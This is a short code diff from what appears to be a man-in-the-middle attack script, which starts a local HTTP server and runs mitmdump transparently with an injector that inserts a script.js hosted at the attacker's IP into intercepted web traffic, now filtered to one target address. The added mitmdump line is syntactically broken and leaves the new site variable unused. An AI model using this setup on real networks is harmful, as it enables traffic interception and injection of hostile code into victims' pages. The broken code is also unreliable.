@@ -49,8 +49,10 @@ os.system("python3 httpServer.py &")
 # run sslstrip
 #os.system("sslstrip -l 8080 &")
 
-# start the mitmproxy
-os.system("mitmdump --no-upstream-cert -s 'injector.py http://" + attacker_ip + ":8001/script.js' -T")
+#site = "captive\-portal\.mav\-start\.hu"
+site = "212.91.30.199"
 
+# start the mitmproxy
+os.system("mitmdump --ignore '^(?!"+ +")' -s 'injector.py http://" + attacker_ip + ":8001/script.js' -T") 
 
 
